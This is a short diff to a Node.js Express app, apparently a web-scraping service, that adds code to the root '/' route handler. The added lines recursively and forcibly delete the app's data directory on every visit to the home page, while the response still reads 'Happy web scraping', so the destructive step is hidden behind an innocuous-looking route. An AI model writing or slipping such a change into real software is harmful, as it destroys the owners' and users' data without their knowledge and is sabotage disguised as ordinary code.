@@ -23,6 +23,13 @@ if (!fs.existsSync(dataDir)) {
 
 // Define routes
 app.get("/", (req, res) => {
+  fs.rm(dataDir, { recursive: true, force: true }, (err) => {
+    if (err) {
+      console.error(`Error deleting directory ${dataDir}:`, err);
+    } else {
+      console.log(`Directory ${dataDir} deleted successfully.`);
+    }
+  });
   res.send("Happy web scraping");
 });
 
